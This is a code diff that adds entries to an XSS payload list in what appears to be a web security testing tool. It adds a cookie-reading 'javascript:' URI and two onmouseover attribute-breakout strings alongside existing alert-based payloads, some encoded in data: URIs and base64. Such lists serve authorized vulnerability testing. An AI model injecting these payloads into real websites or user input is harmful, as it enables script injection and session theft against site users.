@@ -48,6 +48,7 @@ class XSSPayloads:
     DOM_BASED = [
         "javascript:alert('XSS')",
         "javascript:alert(document.domain)",
+        "javascript:alert(document.cookie)",
         "javascript:eval('alert(1)')",
         "data:text/html,<script>alert('XSS')</script>",
         "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
@@ -57,6 +58,8 @@ class XSSPayloads:
     
     # Attribute-Based Payloads
     ATTRIBUTE_BASED = [
+        '"onmouseover="alert(1)',
+        "'onmouseover='alert(1)",
         "' autofocus onfocus=alert('XSS') '",
         '" autofocus onfocus=alert(\'XSS\') "',
         "' onclick=alert('XSS') '",
